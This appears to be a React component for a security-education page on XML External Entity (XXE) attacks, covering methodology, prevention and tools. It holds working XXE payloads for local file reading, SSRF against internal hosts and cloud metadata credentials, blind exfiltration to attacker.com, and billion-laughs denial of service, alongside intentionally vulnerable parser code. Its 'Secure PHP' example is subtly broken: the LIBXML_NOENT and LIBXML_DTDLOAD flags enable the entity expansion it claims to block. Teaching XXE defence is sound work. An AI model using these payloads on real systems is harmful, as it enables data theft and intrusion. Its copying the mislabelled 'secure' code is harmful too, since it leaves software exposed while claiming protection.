
import React from 'react';
import { File } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { InfoIcon } from 'lucide-react';

const XXE: React.FC = () => {
  return (
    <section id="xxe" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">XML External Entity (XXE)</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            XML External Entity (XXE) attacks occur when an application processes XML from untrusted sources without
            properly disabling external entity references. Attackers can exploit vulnerable XML processors to access
            local files, perform server-side request forgery, conduct internal port scanning, or in some cases, execute
            remote code. This vulnerability is particularly dangerous in legacy systems or applications that process XML data.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Access sensitive files on the server, perform SSRF attacks to reach internal systems, cause denial of service,
              or extract sensitive data through out-of-band techniques by exploiting XML parsers that process external entities.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of XXE Attacks</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="Classic XXE"
              description="Direct exploitation of XML parsers to access local files by defining external entities that reference file:// URLs. Results are displayed directly in the application response."
              severity="high"
            />
            <SecurityCard
              title="Blind XXE"
              description="XXE attacks where no direct output is visible, requiring out-of-band techniques like DNS lookups or HTTP requests to exfiltrate data to attacker-controlled servers."
              severity="high"
            />
            <SecurityCard
              title="Error-based XXE"
              description="Triggering XML parsing errors that reveal sensitive information in error messages, often used when direct file inclusion doesn't work."
              severity="medium"
            />
            <SecurityCard
              title="SSRF via XXE"
              description="Using XXE to make the server perform requests to internal systems, potentially accessing services not directly reachable from the internet."
              severity="high"
            />
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>SOAP Web Services:</strong> XML-based messaging protocols often vulnerable to XXE</li>
              <li><strong>REST APIs accepting XML:</strong> APIs that parse XML input without proper sanitization</li>
              <li><strong>Document Upload Features:</strong> Applications parsing uploaded XML, DOCX, XLSX files</li>
              <li><strong>Configuration Files:</strong> Applications parsing XML configuration files from user input</li>
              <li><strong>XML-RPC Services:</strong> Remote procedure call implementations using XML</li>
              <li><strong>RSS/Atom Feed Parsers:</strong> Applications processing external XML feeds</li>
              <li><strong>SVG File Processors:</strong> Image processing libraries that parse SVG files</li>
            </ul>
          </div>
        </div>

        {/* Why These Attacks Work */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Why XXE Attacks Work</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Technical Weaknesses</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>XML parsers with external entity processing enabled by default</li>
                <li>Lack of input validation on XML content</li>
                <li>DTD (Document Type Definition) processing enabled</li>
                <li>No restrictions on entity resolution protocols</li>
                <li>Missing XML parser security configurations</li>
                <li>Legacy XML processing libraries with known vulnerabilities</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Implementation Flaws</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Trusting user-supplied XML without validation</li>
                <li>Processing XML from untrusted sources</li>
                <li>Default XML parser configurations in frameworks</li>
                <li>Insufficient error handling revealing system information</li>
                <li>No network access controls for XML processing</li>
                <li>Missing content-type validation</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Step-by-Step Attack Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Attack Methodology</h4>
          <Tabs defaultValue="reconnaissance">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="reconnaissance">Reconnaissance</TabsTrigger>
              <TabsTrigger value="detection">Detection</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="data-exfiltration">Data Exfiltration</TabsTrigger>
            </TabsList>
            
            <TabsContent value="reconnaissance" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: XML Processing Reconnaissance</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Identify XML Input Points:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Look for endpoints accepting XML content-type</li>
                      <li>Check file upload functionality for XML/Office documents</li>
                      <li>Identify SOAP services and XML-RPC endpoints</li>
                      <li>Find RSS/Atom feed processing features</li>
                    </ul>
                  </li>
                  <li><strong>Analyze Response Patterns:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Submit malformed XML to observe error messages</li>
                      <li>Check for XML parsing error details</li>
                      <li>Identify XML parser type from error messages</li>
                      <li>Test response time for blind XXE detection</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="detection" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: XXE Vulnerability Detection</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Detection Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Basic Entity Test:</strong> Submit XML with simple external entity</li>
                    <li><strong>File Access Test:</strong> Try to access common system files</li>
                    <li><strong>Network Callback Test:</strong> Use external entities pointing to attacker server</li>
                    <li><strong>Error-based Detection:</strong> Trigger parsing errors to reveal information</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: XXE Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exploitation Methods:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>File Disclosure:</strong> Access sensitive files like /etc/passwd, web.config</li>
                    <li><strong>SSRF Attacks:</strong> Make requests to internal services</li>
                    <li><strong>Port Scanning:</strong> Enumerate internal network services</li>
                    <li><strong>DoS Attacks:</strong> Use billion laughs attack or recursive entities</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="data-exfiltration" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Data Exfiltration</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exfiltration Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Direct Response:</strong> File contents displayed in application response</li>
                    <li><strong>Out-of-Band:</strong> Use external DTD to exfiltrate data via HTTP/DNS</li>
                    <li><strong>Error-based:</strong> Trigger errors containing sensitive data</li>
                    <li><strong>Time-based:</strong> Use conditional logic to extract data bit by bit</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Example Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">XXE Attack Payloads</h4>
          <CodeExample 
            language="xml" 
            isVulnerable={true}
            title="Basic XXE File Disclosure" 
            code={`<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
</userInfo>

<!-- Windows equivalent -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
</userInfo>`} 
          />
          
          <CodeExample 
            language="xml" 
            isVulnerable={true}
            title="SSRF via XXE" 
            code={`<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
</userInfo>

<!-- Port scanning -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
</userInfo>

<!-- AWS metadata service -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
</userInfo>`} 
          />
          
          <CodeExample 
            language="xml" 
            isVulnerable={true}
            title="Blind XXE with Data Exfiltration" 
            code={`<!-- Step 1: Host evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/collect?data=%file;'>">
%eval;
%exfiltrate;

<!-- Step 2: Trigger the blind XXE -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>Doe</lastName>
</userInfo>

<!-- Alternative blind XXE using error-based technique -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistentEntity;/%file;'>">
  %error;
  %content;
]>
<userInfo>&content;</userInfo>`} 
          />
          
          <CodeExample 
            language="xml" 
            isVulnerable={true}
            title="Billion Laughs DoS Attack" 
            code={`<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`} 
          />
        </div>

        {/* Vulnerable Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
          <CodeExample 
            language="java" 
            isVulnerable={true}
            title="Vulnerable Java XML Processing" 
            code={`// Vulnerable DocumentBuilderFactory usage
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document document = db.parse(userInput); // XXE vulnerable

// Vulnerable SAX Parser
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.parse(userInput, handler); // XXE vulnerable

// Vulnerable XMLReader
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.parse(userInput); // XXE vulnerable

// Vulnerable Spring XML processing
@PostMapping("/xml")
public ResponseEntity<String> processXml(@RequestBody String xml) {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();
    Document doc = builder.parse(new ByteArrayInputStream(xml.getBytes()));
    // Process document - vulnerable to XXE
    return ResponseEntity.ok("Processed");
}`} 
          />
          
          <CodeExample 
            language="php" 
            isVulnerable={true}
            title="Vulnerable PHP XML Processing" 
            code={`<?php
// Vulnerable libxml usage
$doc = new DOMDocument();
$doc->loadXML($userInput); // XXE vulnerable

// Vulnerable SimpleXML
$xml = simplexml_load_string($userInput); // XXE vulnerable

// Vulnerable XMLReader
$reader = new XMLReader();
$reader->XML($userInput); // XXE vulnerable

// Vulnerable SOAP processing
class VulnerableSOAP extends SoapServer {
    public function processRequest($xml) {
        $dom = new DOMDocument();
        $dom->loadXML($xml); // XXE vulnerable
        return $this->processDocument($dom);
    }
}
?>`} 
          />
          
          <CodeExample 
            language="csharp" 
            isVulnerable={true}
            title="Vulnerable .NET XML Processing" 
            code={`// Vulnerable XmlDocument usage
XmlDocument doc = new XmlDocument();
doc.LoadXml(userInput); // XXE vulnerable

// Vulnerable XmlReader with default settings
XmlReader reader = XmlReader.Create(stream);
// Default settings allow DTD processing

// Vulnerable XmlTextReader
XmlTextReader reader = new XmlTextReader(stream);
// DTD processing enabled by default

// Vulnerable SOAP service
[WebMethod]
public string ProcessXml(string xmlData)
{
    XmlDocument doc = new XmlDocument();
    doc.LoadXml(xmlData); // XXE vulnerable
    return ProcessDocument(doc);
}`} 
          />
        </div>

        {/* Secure Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Secure XML Processing Implementation</h4>
          <CodeExample 
            language="java" 
            isVulnerable={false}
            title="Secure Java XML Processing" 
            code={`// Secure DocumentBuilderFactory configuration
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Disable DTDs completely
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Disable external general entities
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
// Disable external parameter entities
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
// Disable external DTDs
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
// Disable XInclude
dbf.setXIncludeAware(false);
// Disable entity expansion
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
Document document = db.parse(userInput);

// Secure SAX Parser configuration
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

SAXParser parser = factory.newSAXParser();
XMLReader reader = parser.getXMLReader();
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Secure Spring configuration
@Configuration
public class XMLConfig {
    @Bean
    public DocumentBuilderFactory secureDocumentBuilderFactory() {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        try {
            factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
            factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
            factory.setXIncludeAware(false);
            factory.setExpandEntityReferences(false);
        } catch (ParserConfigurationException e) {
            logger.error("Error configuring XML parser", e);
        }
        return factory;
    }
}`} 
          />
          
          <CodeExample 
            language="php" 
            isVulnerable={false}
            title="Secure PHP XML Processing" 
            code={`<?php
// Secure libxml configuration
libxml_disable_entity_loader(true);

// Secure DOMDocument usage
$dom = new DOMDocument();
$dom->resolveExternals = false;
$dom->substituteEntities = false;
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);

// Secure SimpleXML usage
$previous = libxml_disable_entity_loader(true);
$xml = simplexml_load_string($userInput, 'SimpleXMLElement', LIBXML_NOENT);
libxml_disable_entity_loader($previous);

// Secure XMLReader usage
$reader = new XMLReader();
$reader->setParserProperty(XMLReader::SUBST_ENTITIES, false);
$reader->setParserProperty(XMLReader::LOADDTD, false);
$reader->XML($userInput);

// Input validation
function validateXMLInput($xml) {
    // Check for DOCTYPE declarations
    if (preg_match('/<!DOCTYPE/i', $xml)) {
        throw new InvalidArgumentException('DOCTYPE declarations not allowed');
    }
    
    // Check for entity declarations
    if (preg_match('/<!ENTITY/i', $xml)) {
        throw new InvalidArgumentException('Entity declarations not allowed');
    }
    
    return $xml;
}
?>`} 
          />
          
          <CodeExample 
            language="csharp" 
            isVulnerable={false}
            title="Secure .NET XML Processing" 
            code={`// Secure XmlDocument configuration
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null; // Disable XML resolver

// Secure XmlReader configuration
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
settings.MaxCharactersFromEntities = 0;

using (XmlReader reader = XmlReader.Create(stream, settings))
{
    doc.Load(reader);
}

// Secure XmlTextReader configuration
XmlTextReader reader = new XmlTextReader(stream);
reader.DtdProcessing = DtdProcessing.Prohibit;
reader.XmlResolver = null;

// Secure XML processing helper
public static class SecureXmlHelper 
{
    public static XmlDocument LoadXmlSecurely(string xml)
    {
        var settings = new XmlReaderSettings
        {
            DtdProcessing = DtdProcessing.Prohibit,
            XmlResolver = null,
            MaxCharactersFromEntities = 0
        };
        
        using (var stringReader = new StringReader(xml))
        using (var xmlReader = XmlReader.Create(stringReader, settings))
        {
            var doc = new XmlDocument();
            doc.XmlResolver = null;
            doc.Load(xmlReader);
            return doc;
        }
    }
}`} 
          />
        </div>

        {/* Testing Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step XXE Testing Methodology</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <h5 className="font-semibold mb-2">Testing Checklist:</h5>
            <ol className="list-decimal pl-6 space-y-2 text-sm">
              <li><strong>Input Point Identification:</strong>
                <ul className="list-disc pl-6 mt-1 space-y-1">
                  <li>Test all XML input endpoints</li>
                  <li>Check file upload functionality</li>
                  <li>Test SOAP/XML-RPC services</li>
                  <li>Examine RSS/Atom feed processing</li>
                </ul>
              </li>
              <li><strong>Basic XXE Detection:</strong>
                <ul className="list-disc pl-6 mt-1 space-y-1">
                  <li>Submit simple external entity references</li>
                  <li>Test file:// protocol access</li>
                  <li>Check for entity expansion in responses</li>
                  <li>Monitor for error messages revealing parser details</li>
                </ul>
              </li>
              <li><strong>Blind XXE Testing:</strong>
                <ul className="list-disc pl-6 mt-1 space-y-1">
                  <li>Use out-of-band techniques with external DTDs</li>
                  <li>Monitor DNS queries to attacker-controlled domains</li>
                  <li>Check HTTP access logs for callback requests</li>
                  <li>Test time-based detection methods</li>
                </ul>
              </li>
              <li><strong>Impact Assessment:</strong>
                <ul className="list-disc pl-6 mt-1 space-y-1">
                  <li>Test file system access capabilities</li>
                  <li>Evaluate SSRF potential against internal services</li>
                  <li>Check for DoS vulnerabilities</li>
                  <li>Assess data exfiltration possibilities</li>
                </ul>
              </li>
            </ol>
          </div>
        </div>

        {/* Testing Tools */}
        <div>
          <h4 className="text-xl font-semibold mb-4">XXE Testing Tools</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite:</strong> XXE detection and exploitation</li>
                <li><strong>OWASP ZAP:</strong> Automated XXE scanning</li>
                <li><strong>XXEinjector:</strong> Specialized XXE exploitation tool</li>
                <li><strong>SQLMap:</strong> XXE detection in some scenarios</li>
                <li><strong>Nuclei:</strong> XXE templates for vulnerability scanning</li>
                <li><strong>Nmap:</strong> XXE detection scripts</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Custom HTTP Servers:</strong> For out-of-band testing</li>
                <li><strong>DNS Monitoring:</strong> Detect blind XXE callbacks</li>
                <li><strong>XML Validators:</strong> Test parser behavior</li>
                <li><strong>Postman/Insomnia:</strong> XML request crafting</li>
                <li><strong>curl/wget:</strong> Command-line testing</li>
                <li><strong>Collaborator:</strong> Out-of-band interaction detection</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive XXE Prevention Strategies</h4>
          <Tabs defaultValue="parser-config">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="parser-config">Parser Configuration</TabsTrigger>
              <TabsTrigger value="input-validation">Input Validation</TabsTrigger>
              <TabsTrigger value="architecture">Architecture</TabsTrigger>
            </TabsList>
            
            <TabsContent value="parser-config" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">XML Parser Security Configuration</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Disable DTD (Document Type Definition) processing completely</li>
                    <li>Disable external entity and parameter entity processing</li>
                    <li>Disable XInclude processing to prevent file inclusion</li>
                    <li>Use the most restrictive parser configuration possible</li>
                    <li>Keep XML processing libraries updated to latest versions</li>
                    <li>Use secure-by-default XML parsing libraries when available</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="input-validation" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Input Validation and Sanitization</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Validate XML against a strict schema (XSD)</li>
                    <li>Sanitize XML input to remove DOCTYPE declarations</li>
                    <li>Use allowlisting for acceptable XML elements and attributes</li>
                    <li>Implement content-type validation</li>
                    <li>Consider using alternative data formats like JSON when possible</li>
                    <li>Implement size limits for XML documents</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="architecture" className="mt-4">
              <div className="space-y-4">
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h5 className="font-semibold mb-2">Architectural Security Measures</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Implement network segmentation to limit SSRF impact</li>
                    <li>Use Web Application Firewalls (WAF) with XXE detection</li>
                    <li>Run XML processing in sandboxed environments</li>
                    <li>Implement file system access controls</li>
                    <li>Monitor and log XML processing activities</li>
                    <li>Use least privilege principles for application permissions</li>
                  </ul>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Special Cases and Environments */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Special Cases and Development Environments</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Framework-Specific Considerations</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Spring Framework:</strong> Configure secure XML beans and disable DTD</li>
                <li><strong>ASP.NET:</strong> Use XmlReaderSettings with DTD disabled</li>
                <li><strong>Django:</strong> Avoid using xml.etree with untrusted input</li>
                <li><strong>Ruby on Rails:</strong> Use Nokogiri with strict parsing</li>
                <li><strong>Node.js:</strong> Use libxmljs or fast-xml-parser securely</li>
                <li><strong>PHP:</strong> Use libxml_disable_entity_loader()</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Environment-Specific Concerns</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Cloud Environments:</strong> XXE can access metadata services</li>
                <li><strong>Docker Containers:</strong> File system access limited by container</li>
                <li><strong>Microservices:</strong> XXE can facilitate service-to-service attacks</li>
                <li><strong>Legacy Systems:</strong> Often have vulnerable XML parsers</li>
                <li><strong>Mobile Apps:</strong> XML processing in mobile backends</li>
                <li><strong>IoT Devices:</strong> Limited security controls on embedded systems</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default XXE;
